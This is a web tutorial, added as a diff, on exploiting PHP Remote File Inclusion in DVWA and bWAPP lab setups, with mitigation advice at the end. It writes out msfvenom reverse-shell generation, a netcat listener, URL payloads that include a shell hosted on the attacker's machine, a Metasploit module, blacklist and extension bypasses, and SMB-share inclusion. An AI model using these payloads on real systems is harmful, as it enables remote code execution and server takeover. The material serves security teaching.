@@ -1,0 +1,157 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/website-hacking/" rel="category tag">Website Hacking</a></span>            </div>
+            <h1 class="post-title entry-title">Comprehensive Guide on Remote File Inclusion (RFI)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/comprehensive-guide-on-remote-file-inclusion-rfi/" rel="bookmark"><time class="entry-date published" datetime="2020-07-31T12:57:26+00:00">July 31, 2020</time><time class="updated" datetime="2025-05-31T21:44:15+00:00">May 31, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;"><em>Have you ever wondered about the URL of the web-applications, some of them might include files from the local or the remote servers as either “<strong>page=</strong>” or “<strong>file=</strong>”</em>. I hope you’re aware of the <strong>File Inclusion </strong>vulnerability. If not, I suggest you revisit our previous <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/comprehensive-guide-to-local-file-inclusion/">article</a> </strong></span>for better understanding, before going deeper with the<strong> Remote File Inclusion Vulernabilty </strong>implemented in this section.</span></p>
+<h3 class="ai-optimize-7"><span style="color: #800000;">Table of Content</span></h3>
+<ul>
+<li class="ai-optimize-8"><span style="color: #000000;">Introduction to RFI</span></li>
+<li class="ai-optimize-9"><span style="color: #000000;">Why Remote file Inclusion Occurs?</span></li>
+<li class="ai-optimize-10"><span style="color: #000000;">Remote File Inclusion Exploitation</span>
+<ul>
+<li class="ai-optimize-11"><span style="color: #000000;">Basic Remote File Inclusion</span></li>
+<li class="ai-optimize-12"><span style="color: #000000;">Reverse Shell through Netcat</span></li>
+<li class="ai-optimize-13"><span style="color: #000000;">RFI over Metasploit</span></li>
+<li class="ai-optimize-14"><span style="color: #000000;">Bypass a Blacklist Implemented</span></li>
+<li class="ai-optimize-15"><span style="color: #000000;">Null Byte Attack</span></li>
+<li class="ai-optimize-16"><span style="color: #000000;">Exploitation through SMB Server</span></li>
+</ul>
+</li>
+<li class="ai-optimize-17"><span style="color: #000000;">Mitigation Steps</span></li>
+</ul>
+<h3 class="ai-optimize-18"><span style="color: #800000;">Introduction</span></h3>
+<p class="ai-optimize-19"><span style="color: #000000;"><strong>Remote File inclusion </strong>is another variant to the <strong>File Inclusion vulnerability,</strong> which arises when the <strong>URI of a file</strong> is <strong>located</strong> <strong>on a different server</strong> and is <strong>passed to as a parameter</strong> to the PHP functions either “include”, “include_once”, “require”, or “require_once”.</span></p>
+<p class="ai-optimize-20"><span style="color: #000000;">The Remote File Inclusion vulnerabilities are easier to exploit but are less common say <strong>in 1 of the 10 web-applications.</strong> Here thus, instead of accessing a file on a local server, the attacker could simply inject his/her vulnerable PHP scripts which are <strong>hosted on his remote web-application</strong> <strong>into the unsanitized web application’s URL</strong>, which thus might  lead to disastrous results as:</span></p>
+<ol>
+<li class="ai-optimize-21"><span style="color: #000000;">Allowing the attacker to execute remote commands on a web server as [RCE].</span></li>
+<li class="ai-optimize-22"><span style="color: #000000;">Provides complete access to the server.</span></li>
+<li class="ai-optimize-23"><span style="color: #000000;">Deface parts of the web, or even steal confidential information.</span></li>
+<li class="ai-optimize-24"><span style="color: #000000;">Implementation of Client-Side attacks as Cross-Site Scripting (XSS).</span></li>
+</ol>
+<p class="ai-optimize-25"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0Ya1gW-ad2s/XyQP5CNlQmI/AAAAAAAAmcY/2GKJioWcXskl9Ip-VqzgDOqHuNcytpHdACLcBGAsYHQ/s1600/01.png"/></span></p>
+<p class="ai-optimize-26"><span style="color: #000000;"><em>Therefore this Remote File Inclusion vulnerability has been reported as <strong>“Critical ”</strong> and with the <strong>CVSS score</strong> of <strong>“9.8”</strong>  under</em>:</span></p>
+<ol>
+<li class="ai-optimize-27"><span style="color: #000000;"><strong>CWE-98</strong>: Improper Control of Filename for Include/Require Statement in PHP Program.</span></li>
+<li class="ai-optimize-28"><span style="color: #000000;"><strong>CWE-20:</strong><strong> Improper Input Validation</strong></span></li>
+<li class="ai-optimize-29"><span style="color: #000000;"><strong>CWE-200: </strong><strong>Exposure of Sensitive Information to an Unauthorized Actor</strong></span></li>
+</ol>
+<h3 class="ai-optimize-30"><span style="color: #800000;">Why Remote File Inclusion Occurs</span></h3>
+<p class="ai-optimize-31"><span style="color: #000000;">Unlike Local File Inclusion, this remote file inclusion vulnerability also occurs due to the poorly written PHP server-side codes where the <strong>input parameters</strong> <strong>are not properly sanitized</strong> or <strong>validated.</strong> </span></p>
+<p class="ai-optimize-32"><span style="color: #000000;">Look at the following code snippet, which thus lets the web-application to suffer from the RFI vulnerability as the developer is only dependable on the <strong>“$file”</strong> <strong>variable</strong> with the <strong>“GET”</strong> <strong>method</strong> and <strong>hadn’t</strong> <strong>placed</strong> any <strong>input</strong> <strong>validation</strong> over it.</span></p>
+<p class="ai-optimize-33"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NjqRlOu3HLQ/XyQP9zyn5MI/AAAAAAAAmcc/Iis3cD8Y2mU1w3wBuCRE-w4f6ZTYEBhdACLcBGAsYHQ/s1600/1.png"/></span></p>
+<p class="ai-optimize-34"><span style="color: #000000;">But this <strong>logical</strong> <strong>error</strong> didn’t fulfil the requirements to RFI vulnerability until the developer <strong>enables</strong> <strong>some</strong> <strong>insecure</strong> <strong>PHP</strong> <strong>settings</strong> as “<strong><em>allow_url_include = On</em></strong>” and “<strong><em>allow_url_fopen = On</em></strong>”, Therefore the combination of these two i.e. the developer logic and the insecure settings, open the gates to the disastrous RFI vulnerability.</span></p>
+<p class="ai-optimize-35"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HNZ4fwu0YMI/XyQQBJmtCiI/AAAAAAAAmcg/foJN_ltTkuobUEjZm-Jq9p3SO3xjw03cACLcBGAsYHQ/s1600/2.png"/></span></p>
+<h3 class="ai-optimize-36"><span style="color: #800000;">Basic Remote File Inclusion</span></h3>
+<p class="ai-optimize-37"><span style="color: #000000;">I guess, up till now, you might be having a clear vision with <strong>what is Remote File Inclusion </strong>and<strong> why it occurs<em>.</em></strong> So let’s try to dig some deeper and <strong>deface</strong> <strong>some</strong> <strong>web-applications</strong> with a goal to achieve a <strong>reverse shell</strong>.</span></p>
+<p class="ai-optimize-38"><span style="color: #000000;">I’ve opened the target IP in my browser and logged in inside <strong>DVWA</strong> as <strong>admin: password, </strong><strong>further</strong> I’ve opted for the <strong>File</strong> <strong>Inclusion</strong> <strong>vulnerability</strong> present on the left-hand side of the window. And even for this time, I’ve kept the <strong>security level</strong> to <strong>low.</strong></span></p>
+<p class="ai-optimize-39"><span style="color: #000000;"><strong>Note :</strong></span></p>
+<p class="ai-optimize-40"><span style="color: #000000;"><strong>allow_url_include</strong> is <strong>disabled</strong> by default. If <strong>allow_url_fopen</strong> is <strong>disabled</strong>, <strong>allow_url_include</strong> is also <strong>disabled</strong></span></p>
+<p class="ai-optimize-41"><span style="color: #000000;">You can <strong>enable</strong> allow_url_include from <strong>php.ini</strong> by running the following commands :</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /etc/php/7.2/apache2/php.ini
+allow_url_include = On
+allow_url_include = Off</pre>
+<p class="ai-optimize-42"><span style="color: #000000;">Therefore now we’ll be presented with a web-page which is suffering from File Inclusion vulnerability as it is simply including the include.php file into its URL parameter as<strong> </strong> </span></p>
+<p class="ai-optimize-43"><span style="color: #000000;"><strong>“</strong><strong>page=include.php</strong><strong>”</strong></span></p>
+<p class="ai-optimize-44"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mHiCUPJo3Aw/XyQQEkcIIKI/AAAAAAAAmck/05EHrLsQCX81KsXguPQ7TMr78sBwMDXKACLcBGAsYHQ/s1600/3.png"/></span></p>
+<p class="ai-optimize-45"><span style="color: #000000;">Let’s try to manipulate this URL parameter and surf <strong>google</strong>.<strong>com</strong> over this <strong>DVWA</strong> application as:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">192.168.0.2/DVWA/vulnerabilities/fi/?page=https://www.google.com</pre>
+<p class="ai-optimize-46"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-oZ7UpDapQYc/XyQQIBMguII/AAAAAAAAmco/ICui4Iyn6c8MFG5UKe7v15rrwGoD-gI2wCLcBGAsYHQ/s1600/4.png"/></span></p>
+<p class="ai-optimize-47"><span style="color: #000000;">Cool !! The below image thus confirms up that this application is vulnerable to RFI vulnerability.</span></p>
+<h3 class="ai-optimize-48"><span style="color: #800000;">Reverse Shell through Netcat</span></h3>
+<p class="ai-optimize-49"><span style="color: #000000;"><em>Won’t you be happy, if we could convert this basic RFI exploitation to a reverse shell, let’s check it out how?</em></span></p>
+<p class="ai-optimize-50"><span style="color: #000000;">Initially, we’ll generate up a payload using the best php one-liner as:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p php/reverse_php lport=4444 lhost=192.168.0.5 &gt; /root/Desktop/shell.php</pre>
+<p class="ai-optimize-51"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CQXQJStkBGY/XyQQLmnLM-I/AAAAAAAAmcs/jeIcWmvchZ4TOIU4QEiMA_NPDAoVcfGnwCLcBGAsYHQ/s1600/05.png"/></span></p>
+<p class="ai-optimize-52"><span style="color: #000000;">Great, let’s now host this directory so that we could use it over in the URL parameter.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python –m SimpleHTTPServer</pre>
+<p class="ai-optimize-53"><span style="color: #000000;">From the below image, you can see that the <strong>Desktop</strong> <strong>folder</strong> has been <strong>hosted</strong> over the <strong>HTTP</strong> <strong>server</strong> on <strong>port</strong> <strong>8000.</strong></span></p>
+<p class="ai-optimize-54"><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-etyNjLMImE4/XyQQOnMJ51I/AAAAAAAAmcw/W8xkboMQZiolbvHZheJx5O6CCer8DGYlwCLcBGAsYHQ/s1600/06.png"/></strong></span></p>
+<p class="ai-optimize-55"><span style="color: #000000;">Now let’s boot up our <strong>Netcat listener </strong>over on <strong>port 4444</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc –lvp 4444</pre>
+<p class="ai-optimize-56"><span style="color: #000000;">As the netcat is about to listen, till that time, let’s include our shell over in the vulnerable URL parameter as :</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">192.168.0.2/DVWA/vulnerabilities/fi/?page=http://192.168.0.5:8000/shell.php</pre>
+<p class="ai-optimize-57"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VJGpHIkjuR4/XyQQR4SLyzI/AAAAAAAAmc4/jDIQ1eXUmMI93vFZoyvLu9HazvdqC6InQCLcBGAsYHQ/s1600/07.png"/></span></p>
+<p class="ai-optimize-58"><span style="color: #000000;">Fire up the forward button and get back our netcat listener, it might have some interesting things for us.\ </span><span style="color: #000000;">Great !! We’ve successfully captured up the reverse shell. Let’s grab up some striking details now.</span></p>
+<p class="ai-optimize-59"><span style="color: #000000;"><strong><img decoding="async" src="https://1.bp.blogspot.com/-t2vgUgaaTAs/XyQQVmtJUQI/AAAAAAAAmdA/bZARmyVWrXk-0Von5nJRmGf9-QSAsQEQACLcBGAsYHQ/s1600/08.png"/> </strong></span></p>
+<h3 class="ai-optimize-60"><span style="color: #800000;">RFI over Metasploit</span></h3>
+<p class="ai-optimize-61"><span style="color: #000000;">Wasn’t the Netcat procedure was long and complicated enough, just to get a reverse shell.</span></p>
+<p class="ai-optimize-62"><span style="color: #000000;">So let’s do some smart work &amp; let’s boot one of the favourite tools of every pentester i.e. <strong>“Metasploit”</strong></span></p>
+<p class="ai-optimize-63"><span style="color: #000000;">But before using any exploit into that, let’s capture up the <strong>HTTP</strong> <strong>Header</strong> of the URL that confirmed us the RFI existence i.e. <strong><em>“page=https://www.google.com” </em></strong> and further <strong>copy</strong> the logged in <strong>PHP session id</strong> along with all the <strong>security information.</strong></span></p>
+<p class="ai-optimize-64"><span style="color: #000000;">Here I’ve used the Live HTTP Header – a firefox plugin, in order to capture the same.</span></p>
+<p class="ai-optimize-65"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bIy1ht1niU8/XyQQej-HlxI/AAAAAAAAmdQ/7CmhErgskxEPEK075H17IDNQor_tbraCQCLcBGAsYHQ/s1600/9.png"/></span></p>
+<p class="ai-optimize-66"><span style="color: #000000;">So, it’s time to get the full control of the web application’s server, just simply execute the following commands and you are good to in:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use exploit/unix/webapp/php_include
+set payload php/meterpreter/bind_tcp
+set RHOST 192.168.0.2
+set PATH /DVWA/vulnerabilities/fi/
+set HEADERS " Cookie: security=low; PHPSESSID=4536da6h54ski6ftv09gdq35ik"
+exploit</pre>
+<p class="ai-optimize-67"><span style="color: #000000;">Wooah !! With some basic executions, we got the <strong>meterpreter</strong> <strong>session</strong>.</span></p>
+<p class="ai-optimize-68"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dJAKPHgJyaU/XyQQjCsefNI/AAAAAAAAmdY/Q1l7QlEDxb0IzkyRFrRlk4a5yomwWthcQCLcBGAsYHQ/s1600/10.png"/></span></p>
+<h3 class="ai-optimize-69"><span style="color: #800000;">Bypass a Blacklist Implemented</span></h3>
+<p class="ai-optimize-70"><span style="color: #000000;">So, it’s not every time we would be lucky enough that the developer sets up the code without any validations. They might set some blacklists with the commonly used elements as “<strong>http:</strong>” or “<strong>https:</strong>”. Or even similar to them in order to secure up their web-application.</span></p>
+<p class="ai-optimize-71"><span style="color: #000000;">Therefore to bypass this implemented blacklist, we need to try all the different combinations like <strong>“HTTP:”</strong> or <strong>“hTTp:”</strong> that the developer might forget to add.</span></p>
+<p class="ai-optimize-72"><span style="color: #000000;">I’ve increased up the <strong>security level to “medium”</strong> and tried up with all the different combinations. From the below image you can see that the  <strong>“HTTPS” </strong>worked for me and would thus be able to exploit the RFI vulnerability again.</span></p>
+<p class="ai-optimize-73"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ntkKjmUZnwE/XyQQnly75oI/AAAAAAAAmdc/Cjnw9bjxv6AuiMevvY9oCY2B2KWlsR-6gCLcBGAsYHQ/s1600/11.png"/></span></p>
+<h3 class="ai-optimize-74"><span style="color: #800000;">Null Byte Attack</span></h3>
+<p class="ai-optimize-75"><span style="color: #000000;"><em>A developer can never forget, to add up a <strong>‘.php’ </strong>extension into their codes at the end of the required variable before it gets included. </em>That is the webserver will interpret every file with the <strong>“.php” extension</strong>.</span></p>
+<p class="ai-optimize-76"><span style="color: #000000;"><em>Thus, if I wish to include <strong>“tryme.txt”</strong> into the URL parameter, the server would <strong>interpret</strong> it as <strong>“tryme.txt.php.” </strong><strong>and drop back an error message.</strong></em></span></p>
+<p class="ai-optimize-77"><span style="color: #000000;"><strong><em> <img decoding="async" src="https://1.bp.blogspot.com/-xFLzyfATLJ4/XyQQyQaHAYI/AAAAAAAAmdo/et0xZMZfdcEE2EPXpNEvNVyof1UY2049QCLcBGAsYHQ/s1600/12.png"/></em></strong></span></p>
+<p class="ai-optimize-78"><span style="color: #000000;">So what should we do when the developer sets this all?</span></p>
+<p class="ai-optimize-79"><span style="color: #000000;">The answer is to go for the <strong>Null</strong> <strong>Byte</strong> <strong>Attack,</strong> using up the question mark <strong>[?]</strong> character. Which will thus <strong>neutralize</strong> the problem of the “<strong>.php</strong>”, forcing the php server to ignore everything after that, as soon as it is interpreted.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">192.168.0.3/bWAPP/rlfi.php?language=http://192.168.0.5:8000/tryme.txt?</pre>
+<p class="ai-optimize-80"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JqP_X25Ihko/XyQQ2VGFu-I/AAAAAAAAmdw/wtHY7q4PngEnlWL911AKhVwnV2Bv70fKACLcBGAsYHQ/s1600/13.png"/></span></p>
+<h3 class="ai-optimize-81"><span style="color: #800000;">Exploitation through SMB Server</span></h3>
+<p class="ai-optimize-82"><span style="color: #000000;">As discussed earlier, <strong>RFI</strong> <strong>vulnerability</strong> is about to impossible until the developer enables up the “<strong>allow_url_include</strong>” or “<strong>allow_url_fopen</strong>” in the <strong>php.ini </strong>file.</span></p>
+<p class="ai-optimize-83"><span style="color: #000000;"><em>But what if, if the developer <strong>never</strong> <strong>enabled</strong> that feature, and run his web application as simple as he could without including any specific file from any remote server. Would it still be vulnerable to RFI?</em></span></p>
+<p class="ai-optimize-84"><span style="color: #000000;"><em>The answer is <strong>“Yes”, </strong>RFI vulnerabilities can be exploited through the <strong>SMB Server </strong>even if the “<strong>allow_url_include</strong>” or “<strong>allow_url_fopen</strong>” is set to <strong>Off.</strong></em></span></p>
+<p class="ai-optimize-85"><span style="color: #000000;"><em>As when the “allow_url_include” in PHP is set to “off”, it <strong>does</strong> <strong>not</strong> <strong>load</strong> any <strong>remote</strong> <strong>HTTP</strong> or <strong>FTP</strong> <strong>URL’s</strong> to prevent remote file inclusion attacks, but this ”allow_url_include” <strong>does</strong> <strong>not</strong> <strong>prevent</strong> <strong>loading</strong> <strong>SMB</strong> <strong>URLs</strong>.</em></span></p>
+<p class="ai-optimize-86"><span style="color: #000000;">Wonder how to grab this all? Let’s exploit it out here in this section. So, I’ve set up the vulnerable <strong>bWAPP </strong>application over in my windows machine. You can do the same from <a style="color: #000000;" href="https://www.hackingarticles.in/web-application-lab-setup-on-windows/">here</a>.</span></p>
+<h5 class="ai-optimize-87"><span style="color: #000000;"><strong>Lets Start !!</strong></span></h5>
+<p class="ai-optimize-88"><span style="color: #000000;">Initially, I had <strong>reconfigured</strong> my <strong>PHP</strong> server by <strong>disallowing</strong> the “<strong>allow_url_include</strong>” and “<strong>allow_url_fopen</strong>” wrapper in the “<strong>php.ini</strong>” file at <strong>C:\xampp\php\</strong></span></p>
+<p class="ai-optimize-89"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BbsrsF0kaGI/XyQQ6ctW2II/AAAAAAAAmd4/ns7bUe3tx_kWM2qY9lclO3ym4wiQ21z8ACLcBGAsYHQ/s1600/14.png"/></span></p>
+<p class="ai-optimize-90"><span style="color: #000000;">Now in order to activate the <strong>SMB</strong> <strong>service</strong> in my Kali machine. I’ve used the impacket toolkit which thus set up everything with a simple one-liner as:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python smbshare.py –smb2support sharepath /root/Desktop/Shells</pre>
+<p class="ai-optimize-91"><span style="color: #000000;">As we are <strong>executing</strong> our <strong>attack</strong> over the <strong>windows</strong> <strong>10</strong>  machine. So here I have used the <strong>“smb2support”, </strong>and had further set the share directory as <strong>/root/Desktop/Shells/</strong> . You can learn more about Impacket from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/impacket-guide-smb-msrpc/">here</a></strong></span>.</span></p>
+<p class="ai-optimize-92"><span style="color: #000000;">From the below image you can see that our directory has been <strong>shared</strong> successfully <strong>over</strong> the <strong>SMB</strong> <strong>server</strong> without any specific credentials.</span></p>
+<p class="ai-optimize-93"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gAoY8z39wVI/XyQQ-O9aqAI/AAAAAAAAmd8/uYU-29Fn6hM6Ik0SHG-F2mS4Hbt01VTNACLcBGAsYHQ/s1600/15.png"/></span></p>
+<p class="ai-optimize-94"><span style="color: #000000;">In order to confirm up the same, let’s check it all out on any windows machine over the “<strong>Run dialog</strong> <strong>box</strong>” as</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">\\192.168.0.8\sharepath\</pre>
+<p class="ai-optimize-95"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5ApkuO7XQv4/XyQRCGnJRqI/AAAAAAAAmeA/9APHGiOvKPkJCK2cZ4t2Smt9UjPYWFtlgCLcBGAsYHQ/s1600/16.png"/></span></p>
+<p class="ai-optimize-96"><span style="color: #000000;">Cool !! Our SMB Server is working perfectly and we’re able to access its shared files.</span></p>
+<p class="ai-optimize-97"><span style="color: #000000;">So let’s get back to our Kali machine and check whether the PHP code is allowing any remote file inclusion or not. From the below image, you can see that when I tried with the basic RFI attack. I was presented with an error message as “<strong>https:// wrapper is disabled</strong>” by <strong>allow_url_include=0. </strong>Which thus confirms me up that the PHP code is blocking the files to be included from any remote server.</span></p>
+<p class="ai-optimize-98"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-M_r5i7LzuyU/XyQRFvnEOSI/AAAAAAAAmeE/nEgV6CwoypUZcucrGGpxsoHhG2JLTKaygCLcBGAsYHQ/s1600/17.png"/></span></p>
+<p class="ai-optimize-99"><span style="color: #000000;">So, it’s time to deface this web-application by bypassing the “<strong>allow_url_include</strong>” <strong>wrapper </strong>with our <strong>SMB</strong> <strong>share</strong> <strong>link</strong> as :</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">192.168.0.3/bWAPP/rlfi.php?language=\\192.168.0.8\sharepath\shell.txt</pre>
+<p class="ai-optimize-100"><span style="color: #000000;">Great !! From the below image you can see that our shell has successfully included into this vulnerable web-application and we’re presented with the contents of it.</span></p>
+<p class="ai-optimize-101"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-85Y-JfI7VKw/XyQRJvGQ-vI/AAAAAAAAmeM/mHUzXLKZh_E333QPmDlzaSCzaXJ8hx40wCLcBGAsYHQ/s1600/18.png"/></span></p>
+<h3 class="ai-optimize-102"><span style="color: #800000;">Mitigation Steps</span></h3>
+<ul>
+<li class="ai-optimize-103"><span style="color: #000000;">To prevent web applications from the file inclusion attacks, we need to use <strong>strong</strong> <strong>input</strong> <b>validation</b>. we should <strong>restrict</strong> the <strong>input</strong> <strong>parameter</strong> to <strong>accept</strong> a <strong>whitelist</strong> of <strong>acceptable</strong> files and <strong>reject</strong> <strong>all</strong> <strong>other</strong> <strong>inputs</strong> that <strong>do</strong> <strong>not</strong> <strong>strictly</strong> <strong>conform</strong> to <strong>specifications</strong>.</span></li>
+</ul>
+<p class="ai-optimize-104"><span style="color: #000000;">Sanitizing user-supplied / controlled inputs to the best of your ability is always preferable. Those inputs are: GET/POST parameters</span></p>
+<ul>
+<li class="ai-optimize-105"><span style="color: #000000;">URL parameters</span></li>
+<li class="ai-optimize-106"><span style="color: #000000;">Cookie values</span></li>
+<li class="ai-optimize-107"><span style="color: #000000;">HTTP header values</span></li>
+</ul>
+<p class="ai-optimize-108"><span style="color: #000000;">This can all be examined with the following code snippet:</span></p>
+<p class="ai-optimize-109"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8yD1j4E329w/XyQSKxZaORI/AAAAAAAAmew/Ln3rMFqSBS4uNnkKKuySxl4HKcYHVp0MACLcBGAsYHQ/s1600/32.png"/></span></p>
+<ul>
+<li class="ai-optimize-110"><span style="color: #000000;"><strong>Develop</strong> or run the <strong>code</strong> in the <strong>most</strong> <strong>recent</strong> <strong>version</strong> of the <strong>PHP</strong> <strong>server</strong> which is <strong>available</strong>. And even <strong>configure</strong> the <strong>PHP</strong> <strong>applications</strong> so that it <strong>does</strong> <strong>not</strong> <strong>use</strong> <strong>register_globals</strong>.</span></li>
+<li class="ai-optimize-111"><span style="color: #000000;">On the <strong>server-side</strong>, configure the <strong>ini</strong> configuration file. By <strong>disallowing</strong> <strong>remote</strong> <strong>file</strong> <strong>include</strong> of <strong>http</strong> <strong>URI</strong> which <strong>limits the ability to include</strong> the <strong>files from remote locations</strong> i.e. by changing the configuration file with the following command:</span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /etc/php/7.2/apache2/php.ini
+"allow_url_fopen = OFF"
+"allow_url_include = OFF"
+sudo service apache2 restart</pre>
+<p class="ai-optimize-112"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_Z5WuMsxTBg/XyQRbJ-RzGI/AAAAAAAAmek/SAixiZXSLzwriPRXEZqMc3gNpzciQruMgCLcBGAsYHQ/s1600/19.png"/></span></p>
+<p class="ai-optimize-113"><span style="color: #000000;">To learn more about Website Hacking. Follow this</span> <a href="https://www.hackingarticles.in/category/website-hacking/"><strong>Link.</strong></a></p>
+<p class="ai-optimize-114"><span style="color: #000000;"><b>Author</b>: Geet Madan is a Certified Ethical Hacker, Researcher and Technical Writer at Hacking Articles on Information Security<b>. </b>Contact <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.linkedin.com/in/geet-madan/"><b>here</b></a></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
